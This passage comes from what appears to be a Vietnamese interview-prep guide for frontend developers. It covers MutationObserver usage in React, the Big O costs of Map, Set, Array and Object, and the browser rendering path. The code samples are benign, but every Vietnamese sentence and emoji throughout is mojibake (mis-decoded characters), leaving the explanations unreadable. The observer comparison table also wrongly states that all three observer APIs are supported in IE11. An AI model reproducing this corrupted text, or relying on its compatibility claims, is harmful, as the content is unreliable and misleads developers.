// B. AUTO-INIT NEW ELEMENTS (Tá»± Äá»™ng Khá»Ÿi Táº¡o Elements Má»›i)
// ============================================

// Giáº£i thÃ­ch: Tá»± Ä‘á»™ng init tooltips, modals cho elements má»›i Ä‘Æ°á»£c thÃªm vÃ o DOM
// Use case: SPA with dynamic content, third-party libraries add elements

function AutoInitializer() {
  useEffect(() => {
    const container = document.querySelector('#dynamic-content') as HTMLElement;
    
    const nodeObserver = new MutationObserver((mutations) => {
      mutations.forEach((mutation) => {
        // Chá»‰ quan tÃ¢m nodes Ä‘Æ°á»£c thÃªm vÃ o
        mutation.addedNodes.forEach((node) => {
          // Kiá»ƒm tra node type (chá»‰ xá»­ lÃ½ element nodes)
          if (node.nodeType === Node.ELEMENT_NODE) {
            const element = node as HTMLElement;
            
            // Auto-init tooltips
            if (element.matches('[data-tooltip]')) {
              console.log('âœ¨ Init tooltip cho:', element);
              initTooltip(element);
            }
            
            // Auto-init modals
            if (element.matches('[data-modal]')) {
              console.log('âœ¨ Init modal cho:', element);
              initModal(element);
            }
            
            // Auto-init date pickers
            if (element.matches('.date-picker')) {
              console.log('âœ¨ Init date picker cho:', element);
              initDatePicker(element);
            }
          }
        });
      });
    });
    
    nodeObserver.observe(container, {
      childList: true, // Theo dÃµi thÃªm/xÃ³a node con
      subtree: true    // Theo dÃµi cáº£ cÃ¡c node con sÃ¢u hÆ¡n (descendants)
    });
    
    return () => nodeObserver.disconnect();
  }, []);
  
  return <div id="dynamic-content">Content will be added here...</div>;
}

function initTooltip(element: HTMLElement) {
  // Init tooltip library...
}

function initModal(element: HTMLElement) {
  // Init modal library...
}

function initDatePicker(element: HTMLElement) {
  // Init date picker library...
}

// ============================================
// C. DEBUG DOM CHANGES (Debug Thay Äá»•i DOM)
// ============================================

// Giáº£i thÃ­ch: Track táº¥t cáº£ thay Ä‘á»•i DOM Ä‘á»ƒ debug
// Use case: PhÃ¡t hiá»‡n third-party library nÃ o Ä‘ang modify DOM

function DOMDebugger() {
  useEffect(() => {
    const debugObserver = new MutationObserver((mutations) => {
      console.group(`ğŸ” ${mutations.length} DOM mutations detected`);
      
      mutations.forEach((mutation, index) => {
        console.log(`\n[${index + 1}] Type: ${mutation.type}`);
        
        if (mutation.type === 'childList') {
          // Nodes Ä‘Æ°á»£c thÃªm
          if (mutation.addedNodes.length > 0) {
            console.log('  â• Added nodes:', Array.from(mutation.addedNodes));
          }
          
          // Nodes bá»‹ xÃ³a
          if (mutation.removedNodes.length > 0) {
            console.log('  â– Removed nodes:', Array.from(mutation.removedNodes));
          }
        }
        
        if (mutation.type === 'attributes') {
          console.log('  ğŸ·ï¸ Attribute changed:', mutation.attributeName);
          console.log('     Old value:', mutation.oldValue);
          console.log('     New value:', (mutation.target as Element).getAttribute(mutation.attributeName!));
        }
        
        if (mutation.type === 'characterData') {
          console.log('  ğŸ“ Text changed');
          console.log('     Old:', mutation.oldValue);
          console.log('     New:', mutation.target.textContent);
        }
      });
      
      console.groupEnd();
    });
    
    // Observe toÃ n bá»™ document (CHá»ˆ cho debug, KHÃ”NG dÃ¹ng production)
    debugObserver.observe(document.body, {
      childList: true,         // Track add/remove nodes
      attributes: true,        // Track attribute changes
      characterData: true,     // Track text changes
      subtree: true,           // Track all descendants
      attributeOldValue: true, // LÆ°u giÃ¡ trá»‹ cÅ©
      characterDataOldValue: true
    });
    
    return () => debugObserver.disconnect();
  }, []);
  
  return <div>DOM Debugger active...</div>;
}
```

**Best Practices (Thá»±c HÃ nh Tá»‘t):**

1. **âœ… Filter chÃ­nh xÃ¡c loáº¡i mutation**
   ```typescript
   observer.observe(element, {
     attributes: true,
     attributeFilter: ['data-state', 'aria-expanded'], // Chá»‰ 2 attributes nÃ y
     // KHÃ”NG: attributes: true (quan sÃ¡t Táº¤T Cáº¢ attributes)
   });
   ```

2. **âœ… DÃ¹ng `attributeFilter` Ä‘á»ƒ giáº£m noise**
   ```typescript
   // âŒ Quan sÃ¡t táº¥t cáº£ attributes â†’ callback fire ráº¥t nhiá»u
   { attributes: true }
   
   // âœ… Chá»‰ quan sÃ¡t 1 attribute cá»¥ thá»ƒ
   { attributes: true, attributeFilter: ['data-theme'] }
   ```

3. **âœ… Disconnect khi khÃ´ng cáº§n**
   ```typescript
   useEffect(() => {
     const observer = new MutationObserver(callback);
     observer.observe(element, config);
     
     return () => observer.disconnect(); // âœ… Cleanup
   }, []);
   ```

4. **âœ… Debounce/batch xá»­ lÃ½ mutations**
   ```typescript
   let mutationQueue: MutationRecord[] = [];
   let timeoutId: number;
   
   const observer = new MutationObserver((mutations) => {
     mutationQueue.push(...mutations);
     
     clearTimeout(timeoutId);
     timeoutId = setTimeout(() => {
       // Xá»­ lÃ½ táº¥t cáº£ mutations cÃ¹ng lÃºc
       processMutations(mutationQueue);
       mutationQueue = [];
     }, 100);
   });
   ```

**Common Mistakes (Lá»—i ThÆ°á»ng Gáº·p):**

```typescript
// âŒ Lá»–I 1: Observe toÃ n document vá»›i subtree â†’ Ráº¥t cháº­m
const badObserver = new MutationObserver((mutations) => {
  // âŒ Logic náº·ng cháº¡y má»—i khi DOM thay Ä‘á»•i (ráº¥t nhiá»u láº§n)
  mutations.forEach((mutation) => {
    expensiveOperation();
  });
});

badObserver.observe(document.body, {
  childList: true,
  subtree: true,  // âŒ Quan sÃ¡t Táº¤T Cáº¢ descendants
  attributes: true // âŒ Quan sÃ¡t Táº¤T Cáº¢ attributes
});
// â†’ Callback fire hÃ ng trÄƒm láº§n/giÃ¢y â†’ App cháº­m

// âœ… Sá»¬A: Scope nhá» + Filter chÃ­nh xÃ¡c
const goodObserver = new MutationObserver((mutations) => {
  mutations.forEach((mutation) => {
    targetedOperation();
  });
});

const specificContainer = document.querySelector('#app-content');
goodObserver.observe(specificContainer, {
  childList: true,
  subtree: false, // âœ… Chá»‰ direct children
  attributeFilter: ['data-state'] // âœ… Chá»‰ 1 attribute
});

// âŒ Lá»–I 2: QuÃªn disconnect â†’ Memory leak
function Component() {
  useEffect(() => {
    const observer = new MutationObserver(callback);
    observer.observe(document.body, config);
    // âŒ Thiáº¿u cleanup
  }, []);
}

// âœ… Sá»¬A: LuÃ´n disconnect
function Component() {
  useEffect(() => {
    const observer = new MutationObserver(callback);
    observer.observe(document.body, config);
    
    return () => observer.disconnect(); // âœ… Cleanup
  }, []);
}

// âŒ Lá»–I 3: Logic Ä‘á»“ng bá»™ náº·ng trong callback
const syncObserver = new MutationObserver((mutations) => {
  mutations.forEach((mutation) => {
    // âŒ Sync operations block main thread
    for (let i = 0; i < 10000; i++) {
      doHeavyCalculation();
    }
  });
});

// âœ… Sá»¬A: Batch + async processing
const asyncObserver = new MutationObserver((mutations) => {
  // Gom mutations
  const addedElements = mutations
    .flatMap(m => Array.from(m.addedNodes))
    .filter(n => n.nodeType === Node.ELEMENT_NODE);
  
  // Xá»­ lÃ½ async
  queueMicrotask(() => {
    processElementsBatch(addedElements);
  });
});
```

---

**ğŸ“Š So SÃ¡nh 3 Observer APIs:**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ TiÃªu ChÃ­            â”‚ Intersection         â”‚ Resize              â”‚ Mutation            â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Theo dÃµi            â”‚ Giao Ä‘iá»ƒm viewport   â”‚ KÃ­ch thÆ°á»›c element  â”‚ Thay Ä‘á»•i DOM        â”‚
â”‚ Use Cases           â”‚ Lazy load, Infinite  â”‚ Responsive, Charts  â”‚ Auto-init, Debug    â”‚
â”‚                     â”‚ scroll, Analytics    â”‚ Layouts             â”‚ Polyfills           â”‚
â”‚ Performance         â”‚ â­â­â­â­â­            â”‚ â­â­â­â­â­           â”‚ â­â­â­â­ (cáº©n tháº­n)  â”‚
â”‚ Complexity          â”‚ Dá»…                   â”‚ Trung bÃ¬nh          â”‚ KhÃ³ (nhiá»u edge     â”‚
â”‚                     â”‚                      â”‚                     â”‚ cases)              â”‚
â”‚ Risk                â”‚ Tháº¥p                 â”‚ Loop náº¿u sai cÃ¡ch   â”‚ Performance náº¿u     â”‚
â”‚                     â”‚                      â”‚                     â”‚ observe rá»™ng        â”‚
â”‚ Browser Support     â”‚ Modern (IE11+)       â”‚ Modern (IE11+)      â”‚ Modern (IE11+)      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**ğŸ¯ Khi NÃ o DÃ¹ng Observer NÃ o?**

- **Intersection Observer**: Lazy loading, Infinite scroll, Visibility tracking
- **Resize Observer**: Responsive components, Charts, Dynamic layouts
- **Mutation Observer**: Auto-init elements, Debug DOM, Third-party integration

**âœ… Tá»•ng Káº¿t:**

Observer APIs lÃ  cÃ´ng cá»¥ máº¡nh máº½ Ä‘á»ƒ theo dÃµi thay Ä‘á»•i DOM má»™t cÃ¡ch hiá»‡u quáº£. Key takeaways:

1. **Hiá»‡u nÄƒng tá»‘t hÆ¡n** event listeners truyá»n thá»‘ng
2. **Báº¥t Ä‘á»“ng bá»™** â†’ khÃ´ng block main thread
3. **Cáº§n cleanup** Ä‘Ãºng cÃ¡ch â†’ trÃ¡nh memory leak
4. **Filter chÃ­nh xÃ¡c** â†’ trÃ¡nh callback fire thá»«a
5. **Debounce logic náº·ng** â†’ trÃ¡nh performance issue

---
</details>



<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ“ˆ Q47: Äá»™ Phá»©c Táº¡p Thuáº­t ToÃ¡n (Big O) - Map, Set, Array, Object</span></summary>


**Tráº£ lá»i:**

- KhÃ¡i niá»‡m: Big O notation mÃ´ táº£ hiá»‡u nÄƒng thuáº­t toÃ¡n khi data tÄƒng lÃªn; quan trá»ng Ä‘á»ƒ chá»n cáº¥u trÃºc dá»¯ liá»‡u phÃ¹ há»£p.
- Map/Set: O(1) average cho get/set/delete nhá» hash table; O(n) worst case khi hash collision nhiá»u (ráº¥t hiáº¿m).
- Object: O(1) average cho property access; tÆ°Æ¡ng tá»± Map nhÆ°ng chá»‰ key string/symbol.
- Array: O(1) index access; O(n) search (indexOf, includes); O(n) insert/delete Ä‘áº§u/giá»¯a (pháº£i shift elements).

**Hoáº¡t Ä‘á»™ng Chi Tiáº¿t:**

**Map/Set - Táº¡i sao O(1)?**

1. **Hash Function**: Key Ä‘Æ°á»£c hash thÃ nh index (0-buckets.length)
2. **Direct Access**: Truy cáº­p bucket qua index â†’ O(1)
3. **Collision Handling**: CÃ¹ng hash â†’ lÆ°u linked list/tree trong bucket
4. **Average Case**: Ãt collision â†’ O(1); hash tá»‘t phÃ¢n bá»‘ Ä‘á»u
5. **Worst Case**: Nhiá»u collision â†’ O(n) (táº¥t cáº£ key cÃ¹ng bucket)

**Internal Structure:**

```
Map internal:
buckets: [
  0: null,
  1: { key: 'a', value: 1, next: { key: 'x', value: 2 } }, // collision chain
  2: { key: 'b', value: 3 },
  ...
]

Hash('a') % buckets.length = 1 â†’ bucket[1]
Hash('x') % buckets.length = 1 â†’ collision â†’ chain vá»›i 'a'
```

**Æ¯u Ä‘iá»ƒm:**

- Map/Set: O(1) thao tÃ¡c, key cÃ³ thá»ƒ lÃ  báº¥t ká»³ type, maintain insertion order, cÃ³ size property
- Object: Syntax ngáº¯n gá»n, JSON serializable, prototype chain
- Array: O(1) index access, nhiá»u built-in methods, maintain order

**NhÆ°á»£c Ä‘iá»ƒm:**

- Map/Set: Syntax dÃ i hÆ¡n Object, khÃ´ng serialize JSON trá»±c tiáº¿p, tá»‘n memory hÆ¡n (hash table overhead)
- Object: Chá»‰ string/symbol keys, khÃ´ng cÃ³ size built-in, cÃ³ thá»ƒ bá»‹ prototype pollution
- Array: O(n) search/insert/delete (khÃ´ng pháº£i cuá»‘i máº£ng), memory fragmentation vá»›i sparse array

**ChÃº thÃ­ch:**

- DÃ¹ng Map khi cáº§n key khÃ´ng pháº£i string hoáº·c thao tÃ¡c thÃªm/xÃ³a thÆ°á»ng xuyÃªn
- DÃ¹ng Object cho config/options Ä‘Æ¡n giáº£n
- DÃ¹ng Array khi cáº§n maintain order vÃ  iterate nhiá»u
- DÃ¹ng Set Ä‘á»ƒ loáº¡i duplicate O(1)

**Code Example:**

```ts
// ============================================
// BIG O COMPARISON TABLE
// ============================================

/**
 * COMPLEXITY CHEAT SHEET:
 *
 * Operation           | Array      | Object     | Map        | Set
 * -------------------|------------|------------|------------|------------
 * Access by key/index | O(1)       | O(1)       | O(1)       | N/A
 * Search by value    | O(n)       | O(n)       | O(n)       | O(1)
 * Insert (end)       | O(1)*      | O(1)       | O(1)       | O(1)
 * Insert (start)     | O(n)       | O(1)       | O(1)       | O(1)
 * Delete             | O(n)       | O(1)       | O(1)       | O(1)
 * Iterate            | O(n)       | O(n)       | O(n)       | O(n)
 *
 * *Array push() amortized O(1) (resize khi cáº§n)
 */

// ============================================
// 1. MAP - O(1) ACCESS/INSERT/DELETE
// ============================================

const userMap = new Map<number, string>();

// Insert O(1) - hash key â†’ tÃ¬m bucket â†’ insert
console.time('Map insert 1M');
for (let i = 0; i < 1_000_000; i++) {
  userMap.set(i, `User${i}`); // O(1) má»—i láº§n
}
console.timeEnd('Map insert 1M'); // ~100-200ms

// Access O(1) - hash key â†’ direct bucket access
console.time('Map get');
const user = userMap.get(500_000); // O(1)
console.timeEnd('Map get'); // ~0.001ms

// Delete O(1) - hash key â†’ tÃ¬m bucket â†’ xÃ³a
console.time('Map delete');
userMap.delete(500_000); // O(1)
console.timeEnd('Map delete'); // ~0.001ms

// Has O(1) - tÆ°Æ¡ng tá»± get
console.log(userMap.has(500_000)); // O(1)

// ============================================
// 2. SET - O(1) ADD/HAS/DELETE
// ============================================

const uniqueIds = new Set<number>();

// Add O(1) - hash value â†’ bucket â†’ check duplicate â†’ insert
console.time('Set add 1M');
for (let i = 0; i < 1_000_000; i++) {
  uniqueIds.add(i); // O(1)
}
console.timeEnd('Set add 1M'); // ~100-200ms

// Has O(1) - hash value â†’ check bucket
console.time('Set has');
const exists = uniqueIds.has(500_000); // O(1)
console.timeEnd('Set has'); // ~0.001ms

// Delete O(1)
uniqueIds.delete(500_000); // O(1)

// Use case: Remove duplicates O(n)
const arrWithDupes = [1, 2, 2, 3, 3, 3, 4];
const unique = [...new Set(arrWithDupes)]; // O(n) iterate + O(1) add = O(n) total
console.log(unique); // [1, 2, 3, 4]

// ============================================
// 3. OBJECT - O(1) PROPERTY ACCESS
// ============================================

const userObj: Record<string, string> = {};

// Insert O(1) - hash key (string) â†’ bucket
console.time('Object insert 1M');
for (let i = 0; i < 1_000_000; i++) {
  userObj[`user${i}`] = `User${i}`; // O(1)
}
console.timeEnd('Object insert 1M'); // ~150-250ms (cháº­m hÆ¡n Map chÃºt)

// Access O(1)
console.time('Object access');
const objUser = userObj['user500000']; // O(1)
console.timeEnd('Object access'); // ~0.001ms

// Delete O(1)
delete userObj['user500000']; // O(1)

// âš ï¸ Prototype chain: O(1) náº¿u own property, O(k) náº¿u trong chain (k = Ä‘á»™ sÃ¢u)
console.log(userObj.toString); // O(k) - tÃ¬m trong prototype chain

// ============================================
// 4. ARRAY - MIXED COMPLEXITY
// ============================================

const arr: number[] = [];

// Push O(1) amortized (resize khi capacity Ä‘áº§y)
console.time('Array push 1M');
for (let i = 0; i < 1_000_000; i++) {
  arr.push(i); // O(1) average
}
console.timeEnd('Array push 1M'); // ~50-100ms (nhanh nháº¥t vÃ¬ sequential memory)

// Access by index O(1) - direct memory offset
console.time('Array access');
const val = arr[500_000]; // O(1)
console.timeEnd('Array access'); // ~0.0001ms (nhanh nháº¥t)

// Search O(n) - pháº£i iterate toÃ n bá»™
console.time('Array indexOf');
const idx = arr.indexOf(500_000); // O(n) worst case
console.timeEnd('Array indexOf'); // ~5-10ms

// Includes O(n)
console.time('Array includes');
const has = arr.includes(500_000); // O(n)
console.timeEnd('Array includes'); // ~5-10ms

// Unshift O(n) - pháº£i shift táº¥t cáº£ elements sang pháº£i
console.time('Array unshift');
arr.unshift(-1); // O(n) - pháº£i move 1M elements
console.timeEnd('Array unshift'); // ~50-100ms

// Shift O(n) - pháº£i shift táº¥t cáº£ elements sang trÃ¡i
console.time('Array shift');
arr.shift(); // O(n)
console.timeEnd('Array shift'); // ~50-100ms

// Splice O(n) - insert/delete á»Ÿ giá»¯a
arr.splice(500_000, 1); // O(n) - pháº£i shift elements sau vá»‹ trÃ­ xÃ³a

// ============================================
// 5. PRACTICAL COMPARISON
// ============================================

// Scenario 1: Lookup by ID (frequent)
// âŒ Array - O(n) every time
const usersArr = [
  { id: 1, name: 'A' },
  { id: 2, name: 'B' },
  // ... 1 million users
];
const user1 = usersArr.find((u) => u.id === 500_000); // O(n) - cháº­m!

// âœ… Map - O(1)
const usersMap = new Map([
  [1, { id: 1, name: 'A' }],
  [2, { id: 2, name: 'B' }],
]);
const user2 = usersMap.get(500_000); // O(1) - nhanh!

// Scenario 2: Check existence
// âŒ Array - O(n)
const tags = ['js', 'ts', 'react', 'vue'];
const hasReact = tags.includes('react'); // O(n)

// âœ… Set - O(1)
const tagSet = new Set(['js', 'ts', 'react', 'vue']);
const hasReact2 = tagSet.has('react'); // O(1)

// Scenario 3: Remove duplicates
// âŒ Array - O(nÂ²) vá»›i nested loop
function removeDupes(arr: number[]): number[] {
  const result: number[] = [];
  for (const item of arr) {
    // O(n)
    if (!result.includes(item)) {
      // O(n)
      result.push(item);
    }
  }
  return result; // O(nÂ²) total
}

// âœ… Set - O(n)
function removeDupesSet(arr: number[]): number[] {
  return [...new Set(arr)]; // O(n) iterate + O(1) add = O(n)
}

// ============================================
// 6. WHY MAP/SET ARE O(1) - VISUALIZATION
// ============================================

/**
 * HASH TABLE INTERNAL STRUCTURE:
 *
 * Hash Function: key â†’ hash code (number)
 * Bucket Index: hash % buckets.length
 *
 * Example: Map vá»›i 8 buckets
 *
 * buckets = [
 *   0: null,
 *   1: Entry('apple', 5) â†’ null,              // No collision
 *   2: Entry('banana', 10) â†’ Entry('blueberry', 12) â†’ null, // Collision!
 *   3: null,
 *   4: Entry('cherry', 8) â†’ null,
 *   5: null,
 *   6: null,
 *   7: null
 * ]
 *
 * GET OPERATION:
 * map.get('banana')
 * 1. hash('banana') = 18
 * 2. bucket_index = 18 % 8 = 2
 * 3. Go to buckets[2]
 * 4. Walk linked list: 'banana' === 'banana' âœ“
 * 5. Return value: 10
 * â†’ O(1) average (chain ngáº¯n)
 *
 * SET OPERATION:
 * map.set('grape', 15)
 * 1. hash('grape') = 10
 * 2. bucket_index = 10 % 8 = 2
 * 3. Collision vá»›i 'banana' chain
 * 4. Append to chain end
 * â†’ O(1) average
 *
 * COLLISION RESOLUTION:
 * - Chaining: Linked list trong bucket
 * - Open Addressing: TÃ¬m bucket trá»‘ng káº¿ tiáº¿p
 * - JS engines dÃ¹ng chaining + resize khi load factor cao
 */

// Minh há»a hash collision
class SimpleHashMap<K, V> {
  private buckets: Array<Array<{ key: K; value: V }>> = [];
  private size = 0;

  constructor(capacity = 16) {
    this.buckets = Array(capacity)
      .fill(null)
      .map(() => []);
  }

  private hash(key: K): number {
    const str = String(key);
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      hash = (hash << 5) - hash + str.charCodeAt(i);
      hash = hash & hash; // Convert to 32-bit integer
    }
    return Math.abs(hash);
  }

  set(key: K, value: V): void {
    const index = this.hash(key) % this.buckets.length;
    const bucket = this.buckets[index];

    // Check if key exists (update)
    for (const entry of bucket) {
      if (entry.key === key) {
        entry.value = value;
        return;
      }
    }

    // New key (append to chain)
    bucket.push({ key, value });
    this.size++;
  }

  get(key: K): V | undefined {
    const index = this.hash(key) % this.buckets.length;
    const bucket = this.buckets[index];

    // Walk chain O(k) where k = chain length (usually small)
    for (const entry of bucket) {
      if (entry.key === key) {
        return entry.value;
      }
    }

    return undefined;
  }

  // Visualize buckets
  visualize(): void {
    this.buckets.forEach((bucket, idx) => {
      if (bucket.length > 0) {
        console.log(
          `Bucket ${idx}:`,
          bucket.map((e) => `${e.key}=${e.value}`).join(' â†’ ')
        );
      }
    });
  }
}

// Demo collision
const hashMap = new SimpleHashMap<string, number>(8);
hashMap.set('apple', 1);
hashMap.set('banana', 2);
hashMap.set('cherry', 3);
hashMap.visualize();
// Output sáº½ show collision náº¿u hash('apple') % 8 === hash('banana') % 8
```

**Best Practices:**

1. **Chá»n cáº¥u trÃºc dá»¯ liá»‡u phÃ¹ há»£p:**

   - Lookup thÆ°á»ng xuyÃªn â†’ Map/Object
   - Check existence â†’ Set
   - Ordered collection + iterate â†’ Array
   - Simple config â†’ Object

2. **Performance tips:**

   - DÃ¹ng Map thay Array.find() cho lookup nhiá»u láº§n
   - DÃ¹ng Set.has() thay Array.includes()
   - Avoid unshift/shift trong loop â†’ dÃ¹ng push + reverse
   - Pre-allocate Array size náº¿u biáº¿t trÆ°á»›c: `new Array(1000000)`

3. **Memory consideration:**

   - Map/Set tá»‘n memory hÆ¡n (~2x overhead cho hash table)
   - Sparse array tá»‘n memory thá»«a
   - Object cÃ³ prototype overhead

4. **Hash collision mitigation:**
   - JS engines tá»± resize hash table khi load factor cao
   - Good hash function phÃ¢n bá»‘ Ä‘á»u keys
   - Modern engines dÃ¹ng advanced techniques (Robin Hood hashing, etc.)

**Mistakes:**

```ts
// âŒ Sai: DÃ¹ng Array.find() trong loop â†’ O(nÂ²)
const users = [
  /* 1M users */
];
const posts = [
  /* 1M posts */
];
posts.forEach((post) => {
  const author = users.find((u) => u.id === post.authorId); // O(n) má»—i láº§n
  // Total: O(nÂ²) = 1 triá»‡u * 1 triá»‡u = 1,000 tá»· operations ğŸ˜±
});

// âœ… ÄÃºng: Build Map trÆ°á»›c â†’ O(n)
const userMap = new Map(users.map((u) => [u.id, u])); // O(n)
posts.forEach((post) => {
  const author = userMap.get(post.authorId); // O(1)
  // Total: O(n) = 1 triá»‡u operations âœ…
});

// âŒ Sai: Check duplicate báº±ng includes â†’ O(nÂ²)
const unique: number[] = [];
arr.forEach((item) => {
  if (!unique.includes(item)) {
    // O(n)
    unique.push(item);
  }
}); // Total O(nÂ²)

// âœ… ÄÃºng: DÃ¹ng Set â†’ O(n)
const unique2 = [...new Set(arr)]; // O(n)

// âŒ Sai: Delete array items trong loop â†’ O(nÂ²)
for (let i = 0; i < arr.length; i++) {
  if (condition) {
    arr.splice(i, 1); // O(n) - shift elements
    i--; // adjust index
  }
} // Total O(nÂ²)

// âœ… ÄÃºng: Filter â†’ O(n)
const filtered = arr.filter((item) => !condition); // O(n)
```

**Káº¿t Luáº­n:**

- **Map/Set O(1)** nhá» hash table: hash key â†’ direct bucket access
- **Array O(1)** index access nhÆ°ng O(n) search/insert/delete
- **Object O(1)** property access, tÆ°Æ¡ng tá»± Map nhÆ°ng key string/symbol only
- Chá»n Ä‘Ãºng data structure â†’ performance tÄƒng exponentially (O(nÂ²) â†’ O(n))

</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸŒ Q48: Tá»« URL Ä‘áº¿n UI - QuÃ¡ TrÃ¬nh Browser Render Má»™t Trang Web (Critical Rendering Path)</span></summary>


**Tráº£ lá»i:**

Khi user nháº­p URL `https://example.com` vÃ  nháº¥n Enter, cÃ³ **12 bÆ°á»›c chÃ­nh** xáº£y ra:

**ğŸŒ PHASE 1: NETWORK (Máº¡ng) - Láº¥y tÃ i nguyÃªn tá»« server**

1. **DNS Lookup (Tra cá»©u DNS)** - ~20-120ms

   - Browser kiá»ƒm tra DNS cache (browser â†’ OS â†’ router â†’ ISP)
   - Náº¿u khÃ´ng cÃ³, query DNS server Ä‘á»ƒ resolve `example.com` â†’ IP `93.184.216.34`
   - **ChÃº thÃ­ch**: Giá»‘ng tra sá»‘ Ä‘iá»‡n thoáº¡i trong danh báº¡ Ä‘á»ƒ biáº¿t Ä‘á»‹a chá»‰ nhÃ 

2. **TCP Handshake (Báº¯t tay 3 bÆ°á»›c)** - ~100-300ms

   - Client gá»­i `SYN` (synchronize) â†’ Server
   - Server gá»­i `SYN-ACK` (acknowledge) â†’ Client
   - Client gá»­i `ACK` â†’ Server
   - **Káº¿t ná»‘i TCP Ä‘Æ°á»£c thiáº¿t láº­p**
   - **ChÃº thÃ­ch**: Giá»‘ng 2 ngÆ°á»i gá»i Ä‘iá»‡n xÃ¡c nháº­n nghe tháº¥y nhau trÆ°á»›c khi nÃ³i chuyá»‡n

3. **TLS Handshake (Náº¿u HTTPS)** - ~100-300ms

   - Client gá»­i `ClientHello` (supported cipher suites)
   - Server gá»­i `ServerHello` + Certificate (SSL cert)
   - Client verify certificate vá»›i CA (Certificate Authority)
   - Trao Ä‘á»•i keys vÃ  thiáº¿t láº­p encrypted connection
   - **ChÃº thÃ­ch**: Giá»‘ng kiá»ƒm tra CMND trÆ°á»›c khi chia sáº» thÃ´ng tin máº­t

4. **HTTP Request** - ~50-200ms

   ```http
   GET / HTTP/1.1
   Host: example.com
   User-Agent: Chrome/120.0
   Accept: text/html
   Accept-Encoding: gzip, deflate, br
   Cookie: session=abc123
   ```

   - Browser gá»­i request lÃªn server
   - **ChÃº thÃ­ch**: Giá»‘ng báº¡n yÃªu cáº§u mÃ³n Äƒn á»Ÿ nhÃ  hÃ ng

5. **Server Processing** - ~100-1000ms

   - Server nháº­n request
   - Xá»­ lÃ½ logic (query database, run business logic)
   - Generate HTML response
   - **ChÃº thÃ­ch**: Báº¿p náº¥u mÃ³n Äƒn báº¡n yÃªu cáº§u

6. **HTTP Response** - ~50-500ms

   ```http
   HTTP/1.1 200 OK
   Content-Type: text/html; charset=utf-8
   Content-Encoding: gzip
   Content-Length: 1234
   Cache-Control: max-age=3600

   <!DOCTYPE html>
   <html>...</html>
   ```

   - Server gá»­i HTML vá» browser
   - **ChÃº thÃ­ch**: MÃ³n Äƒn Ä‘Æ°á»£c mang ra bÃ n

**ğŸ¨ PHASE 2: PARSING (PhÃ¢n tÃ­ch) - Browser xá»­ lÃ½ HTML/CSS/JS**

7. **HTML Parsing â†’ DOM Tree** - ~100-500ms

   ```
   HTML: <div><p>Hello</p></div>

   DOM Tree:
   Document
   â””â”€â”€ html
       â””â”€â”€ body
           â””â”€â”€ div
               â””â”€â”€ p
                   â””â”€â”€ "Hello"
   ```

   - Browser parse HTML tá»« trÃªn xuá»‘ng (top-to-bottom)
   - Táº¡o **DOM (Document Object Model)** tree
   - **âš ï¸ Blocking**: Khi gáº·p `<script>`, dá»«ng parsing cho Ä‘áº¿n khi script execute xong
   - **ChÃº thÃ­ch**: Äá»c cÃ´ng thá»©c náº¥u Äƒn vÃ  chuáº©n bá»‹ nguyÃªn liá»‡u

8. **CSS Parsing â†’ CSSOM Tree** - ~50-200ms

   ```
   CSS: div { color: red; }

   CSSOM Tree:
   StyleSheet
   â””â”€â”€ div
       â””â”€â”€ color: red
   ```

   - Parse `<link>` vÃ  `<style>` tags
   - Táº¡o **CSSOM (CSS Object Model)** tree
   - **âš ï¸ Render-blocking**: Pháº£i Ä‘á»£i táº¥t cáº£ CSS load xong má»›i render
   - **ChÃº thÃ­ch**: Chuáº©n bá»‹ gia vá»‹ vÃ  cÃ¡ch trang trÃ­ mÃ³n Äƒn

9. **JavaScript Execution** - ~100-2000ms
   ```javascript
   // Khi gáº·p <script src="app.js">
   // 1. Download app.js (náº¿u external)
   // 2. Parse & Compile JS
   // 3. Execute code (cÃ³ thá»ƒ modify DOM/CSSOM)
   ```
   - **âš ï¸ Parser-blocking**: `<script>` cháº·n HTML parsing
   - **âœ… async/defer**: KhÃ´ng cháº·n parsing
     - `async`: Download parallel, execute ngay khi xong (khÃ´ng Ä‘áº£m báº£o thá»© tá»±)
     - `defer`: Download parallel, execute sau khi HTML parse xong (Ä‘áº£m báº£o thá»© tá»±)
   - **ChÃº thÃ­ch**: ThÃªm hÃ nh Ä‘á»™ng Ä‘áº·c biá»‡t vÃ o mÃ³n Äƒn (vd: flambe)

**ğŸ–¼ï¸ PHASE 3: RENDERING (Váº½ lÃªn mÃ n hÃ¬nh) - Critical Rendering Path**

10. **Render Tree Construction** - ~50-200ms

    ```
    DOM + CSSOM â†’ Render Tree

    Render Tree chá»‰ chá»©a:
    - Visible elements (khÃ´ng cÃ³ display: none)
    - Vá»›i computed styles (font, color, position...)
    ```

    - Káº¿t há»£p DOM + CSSOM
    - Loáº¡i bá» invisible nodes (`display: none`, `<head>`, `<script>`)
